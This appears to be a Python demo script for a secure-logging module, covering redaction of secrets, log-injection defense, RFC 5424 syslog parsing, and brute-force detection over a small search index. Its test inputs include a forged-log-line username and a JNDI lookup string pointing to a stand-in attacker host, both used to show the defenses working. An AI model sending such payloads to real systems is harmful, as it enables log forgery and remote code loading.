import json
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import seclog as s  # noqa: E402

print("1. Redaction before writing")
event = {"event": "payment", "user": "asha.k@example.in", "authorization": "Bearer " + s.fake_jwt(),
         "card": "4111 1111 1111 1111", "note": "client sent token " + s.fake_jwt(), "amount": 499}
print("   raw     :", json.dumps(event)[:110] + "...")
print("   redacted:", json.dumps(s.redact(event)))

print("\n2. Log injection")
evil_user = "bob\n2026-11-19T10:00:05Z user=admin login success"
print("   naive line(s):")
for line in s.naive_log_line("2026-11-19T10:00:04Z", evil_user, "login failed").splitlines():
    print("     |", line)
print("   safe line:\n     |", s.safe_log_line("2026-11-19T10:00:04Z", evil_user, "login failed"))
print("   lookup neutralized:", s.neutralize("${jndi:ldap://attacker.test/a}"))

print("\n3. RFC 5424 syslog")
t0 = datetime(2026, 11, 19, 10, 0, 0, tzinfo=timezone.utc)
lines = []
for i in range(6):
    lines.append(s.format_rfc5424("authpriv", "warning", t0 + timedelta(seconds=7 * i), "api-1", "orders-api", "4242",
                                  "AUTHFAIL", {"audit@32473": {"action": "login", "outcome": "failure", "user": "cfo",
                                                               "src": "203.0.113.50", "req": f"r-{i}"}},
                                  'login failed for "cfo"'))
lines.append(s.format_rfc5424("authpriv", "info", t0 + timedelta(seconds=50), "api-1", "orders-api", "4242", "AUTHOK",
                              {"audit@32473": {"action": "login", "outcome": "success", "user": "cfo", "src": "203.0.113.50", "req": "r-6"}},
                              "login ok"))
lines.append(s.format_rfc5424("authpriv", "warning", t0 + timedelta(seconds=55), "api-2", "orders-api", "77", "AUTHFAIL",
                              {"audit@32473": {"action": "login", "outcome": "failure", "user": "asha", "src": "198.51.100.4", "req": "r-7"}},
                              "login failed"))
lines.append("this is not syslog")
print("   ", lines[0])
print("    parsed:", s.parse_rfc5424(lines[0]))

print("\n4. ELK-like pipeline and queries")
idx = s.MiniIndex()
pipe = s.Pipeline(idx)
for line in lines:
    pipe.process(line)
print("   indexed:", len(idx.docs), "| dead-letter:", pipe.dead_letter)
q = "event.action:login AND event.outcome:failure"
print(f"   {q} ->", len(idx.query(q)), "hits; by source.ip:", dict(idx.count_by("source.ip", idx.query(q))))
q2 = "source.ip:203.0.113.* AND event.outcome:success"
print(f"   {q2} ->", [d["http.request.id"] for d in idx.query(q2)])
print("   detection:", s.detect_bruteforce(idx))
